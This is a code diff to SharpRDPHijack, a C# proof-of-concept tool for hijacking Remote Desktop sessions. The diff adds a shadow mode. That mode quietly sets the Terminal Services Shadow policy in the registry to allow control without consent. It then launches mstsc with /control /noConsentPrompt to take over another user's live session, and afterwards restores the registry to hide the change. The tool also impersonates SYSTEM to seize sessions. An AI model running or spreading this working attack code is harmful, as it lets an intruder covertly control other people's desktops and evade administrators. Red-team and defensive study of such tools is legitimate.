@@ -4,6 +4,7 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace SharpRDPHijack
 {
@@ -17,9 +18,12 @@ namespace SharpRDPHijack
                 int session = -1;
                 int receiver = -1;
                 string password = "";
-                bool console = false;
-                bool disconnect = false;
                 string tsquery = "";
+                bool connect = true;
+                bool disconnect = false;
+                bool console = false; 
+                bool shadow = false;
+                
 
                 foreach (string arg in args)
                 {
@@ -31,13 +35,25 @@ namespace SharpRDPHijack
                         password = arg.Split(new string[] { "--password=" }, StringSplitOptions.None)[1];
                     if (arg.StartsWith("--console"))
                         console = true;
+                    if (arg.StartsWith("--shadow"))
+                    {
+                        shadow = true;
+                        connect = false;
+                    }
                     if (arg.StartsWith("--disconnect"))
+                    {
                         disconnect = true;
+                        connect = false;
+                        shadow = false;
+                    }
                 }
 
                 //if no args, display usage
-                if (args.Length < 1)
+                if (args.Length == 0)
+                {
                     Usage();
+                    return;
+                }
 
                 // ------ RDP / TS Session Query...
                 if (tsquery.Length > 0)
@@ -48,19 +64,19 @@ namespace SharpRDPHijack
                     {
                         GetTSSessions(tsquery);
                     }
-                    Environment.Exit(0);
+                    return;
                 }
 
                 // ------ RDP Session Hijack...
                 //Session is mandatory - if not selected, display usage
                 if (session < 0)
-                    Usage();
+                    return;
 
                 //Check if elevated admin
                 if (!IsElevatedAdmin())
                 {
                     Console.WriteLine("\n[-] For RDP hijack, this program must be run in elevated administrator context\n");
-                    Environment.Exit(0);
+                    return;
                 }
 
                 //Get active session for redirection (either current session or console (if --console is specified)
@@ -76,7 +92,7 @@ namespace SharpRDPHijack
                     if (!AdjustTokenPrivilege("SeDebugPrivilege"))
                     {
                         Console.WriteLine("\n[-] Could not adjust token privilege: SeDebugPrivilege\n");
-                        Environment.Exit(0);
+                        return;
                     }
 
                     //Impersonate a process with NT AUTHORITY\SYSTEM context
@@ -85,19 +101,31 @@ namespace SharpRDPHijack
                     if (!ImpersonateContext(proc))
                     {
                         Console.WriteLine("\n[-] Could not impersonate target context from process: " + proc + "\n");
-                        Environment.Exit(0);
+                        return;
                     }
                 }
 
-                //Perform WTS action (probably should implement a few guardrails/checks and check for available session but this is handled semi-gracefully)
+                //Perform WTS action 
                 int res = -1;
                 if (disconnect)
                     res = Win32.WTSDisconnectSession(IntPtr.Zero, session, true);
-                else
+                else if (connect)
                     res = Win32.WTSConnectSession(session, receiver, password, true);
 
-                if (res == 0)
-                    Console.WriteLine("\n[-] Failed to connect to session: " + session.ToString() + "\n");
+                //Perform shadow action
+                res = -1;
+                if (shadow)
+                {
+                    if (console)
+                        res = Win32.WTSConnectSession(session, receiver, password, true);
+                    if (res != 0)
+                        ShadowConnect(session);
+                    else
+                    {
+                        Console.WriteLine("\n[-] Failed to connect to session: " + session.ToString() + "\n");
+                        return;
+                    }
+                }
             }
             catch (Exception ex)
             {
@@ -108,15 +136,16 @@ namespace SharpRDPHijack
         static void Usage()
         {
             Console.WriteLine("----------------\nSharp RDP Hijack\n----------------\n");
-            Console.WriteLine("[*] A proof-of-concept Remote Desktop (RDP) session hijack utility for disconnected sessions");
+            Console.WriteLine("[*] A proof-of-concept Remote Desktop (RDP) session hijack utility");
             Console.WriteLine("    - For session hijacking, this utility must be run in an elevated context to connect to another session");
-            Console.WriteLine("      If a password is not specified, NT AUTHORITY\\SYSTEM is impersonated\n");
-            Console.WriteLine("    - For session query, admin privileges may vary depending on target machine\n");
-            Console.WriteLine("[*] Parameters: ");
+            Console.WriteLine("    - If a password is not specified, NT AUTHORITY\\SYSTEM is impersonated");
+            Console.WriteLine("    - For session query, admin privileges or \"Remote Desktop Users\" group membership is required on the target machine\n");
+            Console.WriteLine("[*] Parameters:");
             Console.WriteLine("    --tsquery=<host> : Query a host to identify RDP/TS session information (not required for other switches)");
             Console.WriteLine("    --session=<ID> : Target session identifier");
             Console.WriteLine("    --password=<User's Password> : Session password if known (otherwise optional - not required for disconnect switch)");
             Console.WriteLine("    --console : Redirect session to console session instead of current (active) session");
+            Console.WriteLine("    --shadow : Shadow an active session");
             Console.WriteLine("    --disconnect : Disconnect an active (remote) session\n");
             Console.WriteLine("[*] Example Usage 1: Impersonate NT AUTHORITY\\SYSTEM to hijack session #6 and redirect to the current session");
             Console.WriteLine("    SharpRDPHijack.exe --session=6\n");
@@ -128,7 +157,10 @@ namespace SharpRDPHijack
             Console.WriteLine("    SharpRDPHijack.exe --session=3 --disconnect\n");
             Console.WriteLine("[*] Example Usage 5: Query the local host for RDP/TS session information");
             Console.WriteLine("    SharpRDPHijack.exe --tsquery=localhost\n");
-            Environment.Exit(0); //not very graceful...
+            Console.WriteLine("[*] Example Usage 6: Shadow active session #3");
+            Console.WriteLine("    SharpRDPHijack.exe --session=3 --shadow\n");
+            Console.WriteLine("[*] Example Usage 6: Shadow inactive session #2 by redirecting the session to the console");
+            Console.WriteLine("    SharpRDPHijack.exe --session=2 --shadow --console\n");
         }
 
         // --------------------------------------------------------------------------
@@ -248,13 +280,17 @@ namespace SharpRDPHijack
                 //if (retVal != 0)
                 if (retVal)
                 {
+                    int console = Win32.WTSGetActiveConsoleSessionId();
                     for (int i = 0; i < dwSessionCount; i++)
                     {
                         Win32.WTS_SESSION_INFO si = (Win32.WTS_SESSION_INFO)Marshal.PtrToStructure((System.IntPtr)currentSession, typeof(Win32.WTS_SESSION_INFO));
                         currentSession += dataSize;
 
                         //Session Id
-                        Console.WriteLine("\nSession ID: " + si.SessionId.ToString());
+                        if (si.SessionId == console)
+                            Console.WriteLine("\nSession ID: " + si.SessionId.ToString() + " [Console]");
+                        else
+                            Console.WriteLine("\nSession ID: " + si.SessionId.ToString());
 
                         //Session State
                         string state = "Unknown";
@@ -311,18 +347,79 @@ namespace SharpRDPHijack
             var username = "";
             if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSUserName, out buffer, out strLen) && strLen > 1)
             {
-                username = Marshal.PtrToStringAnsi(buffer); // don't need length as these are null terminated strings
+                username = Marshal.PtrToStringAnsi(buffer); // Don't need length as these are null terminated strings
                 Win32.WTSFreeMemory(buffer);
                 if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSDomainName, out buffer, out strLen) && strLen > 1)
                 {
-                    username = Marshal.PtrToStringAnsi(buffer) + "\\" + username; // prepend domain name
+                    username = Marshal.PtrToStringAnsi(buffer) + "\\" + username; // Prepend domain name
                     Win32.WTSFreeMemory(buffer);
                 }
             }
             return username;
         }
 
+        static void ShadowConnect(int sessionId)
+        {
+            string regKey = @"SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services";
+            string shadowValue = "Shadow";
+            int activePolicy = -1;
+
+            try
+            {
+                //Check for Shadow policy in Registry and set new policy (if not a value of 2)
+                RegistryKey key = Registry.LocalMachine.OpenSubKey(regKey, writable: true);
+                if (key == null) //Create Key and value
+                {
+                    key = Registry.LocalMachine.CreateSubKey(regKey);
+                    key.SetValue(shadowValue, 2, RegistryValueKind.DWord);
+                }
+                else //Create/adjust value
+                {
+                    object registryValue = key.GetValue(shadowValue);
+
+                    if (registryValue == null) //Value does not exist - create it
+                    {
+                        activePolicy = -2;
+                        key.SetValue(shadowValue, 2, RegistryValueKind.DWord);
+                    }
+                    else // Value exists - change it
+                    {
+                        activePolicy = (int)registryValue; //Assuming DWORD value
+                        key.SetValue(shadowValue, 2, RegistryValueKind.DWord);
+                    }
+                }
+
+                //Launch mstsc.exe to shadow RDP session
+                Thread.Sleep(3000);
+                string mstsc = Environment.GetEnvironmentVariable("SystemRoot") + @"\System32\mstsc.exe";
+                string args = "/shadow:" + sessionId.ToString() + @" /control /noConsentPrompt";
+                Process process = new Process();
+                process.StartInfo = new ProcessStartInfo
+                {
+                    FileName = mstsc,
+                    Arguments = args,
+                };
+                Process.Start(process.StartInfo);
+                Thread.Sleep(3000);
+
+                //Cleanup registry
+                if (activePolicy == -1) //Remove registry key
+                    Registry.LocalMachine.DeleteSubKeyTree(regKey);
+
+                else if (activePolicy == -2)  //Remove value
+                    key.DeleteValue(shadowValue);
+                
+                else //Restore policy
+                    key.SetValue(shadowValue, activePolicy, RegistryValueKind.DWord);
+                
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("\n [-] Error: " + e.Message + "\n");
+            }
+        }
     }
+
     class Win32
     {
         // ----------------------------------------WTS P-Invoke Definitions
